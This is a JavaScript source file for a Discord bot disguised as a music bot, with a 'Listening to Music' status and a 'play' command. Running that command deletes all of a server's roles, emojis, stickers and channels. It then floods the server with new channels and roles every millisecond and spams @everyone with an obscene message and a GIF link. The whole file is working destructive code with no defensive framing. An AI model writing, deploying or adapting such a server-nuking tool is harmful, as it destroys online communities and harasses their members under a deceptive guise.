const { Client, Intents } = require("discord.js");
const bot = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red } = require("chalk");
const { token, prefix } = require("./config.json")

bot.on("ready", () => {
    console.clear();
    console.log(red(`                                  
                    NukeNerd is ready to nuke.
    `))
    bot.user.setActivity({ name: "Music", type: "LISTENING" });
});

bot.on("messageCreate", (message) => {
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    if (message.content.startsWith(prefix + "play")) {
        play();
    }

    function play(channelName, roleName, i) {
        return new Promise((resolve, reject) => {

            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Error Found: " + err)) }))

            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");

            if (message.guild.channels.cache.size === 500);
            setInterval(() => {
                if (!channelName) {
                    message.guild.channels.create(`GIFs creator HQ was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("# @everyone Imagine getting fucked by QCHQ https://cdn.discordapp.com/attachments/806863430589087804/1142864360113451210/getkaced.gif");
                        }, 1);
                    });
                }
            }, 1)

            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Error Found: " + err)) }))

            if (message.guild.roles.cache.size === 250);
            if (!roleName) {
                message.guild.roles.create({ name: "Nuked by: GIFs creator HQ", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                    setInterval(() => {
                        message.guild.roles.create({ name: "Nuked by: GIFs creator HQ", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
                    }, 1);
                });
            }
 
            resolve();
        });
    }

}
);

try {
    bot.login(token);
} catch (err) {
    console.error(err)
}
